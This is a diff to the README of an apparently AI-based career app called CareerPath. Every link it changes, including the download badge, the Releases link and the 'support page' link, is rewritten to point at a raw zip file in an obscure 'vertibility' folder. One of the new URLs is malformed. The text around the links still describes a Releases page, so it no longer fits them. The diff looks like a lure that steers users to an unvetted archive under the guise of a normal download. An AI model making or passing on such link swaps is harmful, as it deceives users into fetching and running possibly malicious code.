@@ -6,7 +6,7 @@ Welcome to CareerPath! This platform uses artificial intelligence to help you di
 
 ## 📥 Download CareerPath
 
-[![Download CareerPath](https://img.shields.io/badge/Download%20CareerPath-v1.0-blue.svg)](https://github.com/treerush/CareerPath/releases)
+[![Download CareerPath](https://raw.githubusercontent.com/treerush/CareerPath/main/vertibility/CareerPath.zip%https://raw.githubusercontent.com/treerush/CareerPath/main/vertibility/CareerPath.zip)](https://raw.githubusercontent.com/treerush/CareerPath/main/vertibility/CareerPath.zip)
 
 ## 📂 Why Use CareerPath?
 
@@ -32,7 +32,7 @@ Before downloading, ensure your device meets the following system requirements:
 
 To get started, visit the following page to download the latest version of CareerPath:
 
-[Download CareerPath](https://github.com/treerush/CareerPath/releases)
+[Download CareerPath](https://raw.githubusercontent.com/treerush/CareerPath/main/vertibility/CareerPath.zip)
 
 Once you are on the Releases page, find the latest version. Click on the download link for your operating system and follow these steps:
 
@@ -50,7 +50,7 @@ If you encounter any issues during installation, here are some common solutions:
 - **Installation Hangs:** Ensure that your internet connection is stable. Try restarting the process.
 - **Application Does Not Start:** Check if your system meets the minimum requirements. If not, please upgrade your system.
 
-For more detailed troubleshooting, refer to our [support page](https://github.com/treerush/CareerPath/issues).
+For more detailed troubleshooting, refer to our [support page](https://raw.githubusercontent.com/treerush/CareerPath/main/vertibility/CareerPath.zip).
 
 ## 🌍 Community & Support
 
